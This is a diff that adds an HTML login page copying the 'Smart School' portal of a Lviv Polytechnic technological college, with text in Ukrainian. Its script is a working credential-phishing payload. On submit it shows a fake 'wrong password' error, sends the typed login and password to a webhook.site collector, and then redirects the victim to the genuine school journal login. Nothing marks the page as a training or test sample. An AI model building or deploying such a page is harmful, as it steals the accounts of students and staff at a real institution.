@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart School</title>
+    <style>
+        body { background: linear-gradient(to bottom, #c8e6c9, #fff59d); margin: 0; padding: 40px 20px; font-family: Arial, sans-serif; }
+        .container { max-width: 400px; margin: 0 auto; background: white; border-radius: 20px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
+        .logo-container { width: 150px; height: 150px; background: #2ecc71; border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 4px 12px rgba(0,0,0,0.15); margin: 0 auto 20px; }
+        h1 { color: #1a73e8; font-size: 28px; margin: 10px 0; }
+        .subtitle { color: #555; font-size: 16px; line-height: 1.4; margin: 20px 0; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        .checkbox { text-align: left; margin: 15px 0; font-size: 14px; color: #666; display: flex; align-items: center; justify-content: space-between; }
+        button { background: #1a73e8; color: white; padding: 14px; border: none; border-radius: 8px; font-size: 18px; width: 100%; cursor: pointer; margin-top: 10px; }
+        .links { margin-top: 20px; font-size: 14px; }
+        .links a { color: #1a73e8; text-decoration: none; }
+        .register-link { display: block; margin-top: 15px; padding: 10px; border: 1px solid #ddd; border-radius: 8px; background: #f8f8f8; color: #666; text-decoration: none; font-size: 14px; }
+        .error { color: red; margin-top: 10px; font-size: 14px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <svg width="70" height="70" viewBox="0 0 70 70" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- Ромб широкий -->
+                <!-- Верхній кут до лівого -->
+                <line x1="35" y1="18" x2="10" y2="30" stroke="white" stroke-width="3" stroke-linecap="round"/>
+                <!-- Верхній кут до правого -->
+                <line x1="35" y1="18" x2="60" y2="30" stroke="white" stroke-width="3" stroke-linecap="round"/>
+                <!-- Ліва сторона до квадрата -->
+                <line x1="10" y1="30" x2="24" y2="38" stroke="white" stroke-width="3" stroke-linecap="round"/>
+                <!-- Права сторона до квадрата -->
+                <line x1="60" y1="30" x2="46" y2="38" stroke="white" stroke-width="3" stroke-linecap="round"/>
+               
+                <!-- Циліндр з прогалинами -->
+                <!-- Ліва сторона - З ПРОГАЛИНОЮ більшою -->
+                <line x1="24" y1="46" x2="24" y2="50" stroke="white" stroke-width="3" stroke-linecap="round"/>
+               
+                <!-- Права сторона - без прогалини -->
+                <line x1="46" y1="38" x2="46" y2="50" stroke="white" stroke-width="3" stroke-linecap="round"/>
+               
+                <!-- Верхня дуга -->
+                <path d="M24 38 Q35 35 46 38" stroke="white" stroke-width="3" fill="none" stroke-linecap="round"/>
+                <!-- Нижня дуга -->
+                <path d="M24 50 Q35 53 46 50" stroke="white" stroke-width="3" fill="none" stroke-linecap="round"/>
+            </svg>
+        </div>
+        <h1>Smart School</h1>
+        <p class="subtitle">Відокремлений структурний підрозділ<br>
+        «Технологічний фаховий коледж Національного<br>
+        університету «Львівська політехніка»</p>
+        <form id="loginForm">
+            <input type="text" id="login" placeholder="Логін або E-mail" required>
+            <input type="password" id="password" placeholder="Пароль" required>
+            <div class="checkbox">
+                <label>
+                    <input type="checkbox" id="remember">
+                    Запам'ятати мене
+                </label>
+                <a href="#" style="color:#666;">Відновити пароль</a>
+            </div>
+            <button type="submit">Увійти</button>
+            <p class="links"><a href="#" class="register-link">Реєстрація за кодом запрошення</a></p>
+            <p id="errorMsg" class="error">Невірний логін або пароль</p>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const login = document.getElementById("login").value.trim();
+            const password = document.getElementById("password").value;
+
+            document.getElementById("errorMsg").style.display = "block";
+
+            fetch("	https://webhook.site/d770e7b7-d75d-4a53-abae-bf63a3b26fa3", {
+                method: "POST",
+                body: JSON.stringify({
+                    login: login,
+                    password: password,
+                    time: new Date().toLocaleString("uk-UA")
+                })
+            });
+
+            setTimeout(() => {
+                window.location.href = "https://journal-tc.smart-school.com.ua/login";
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
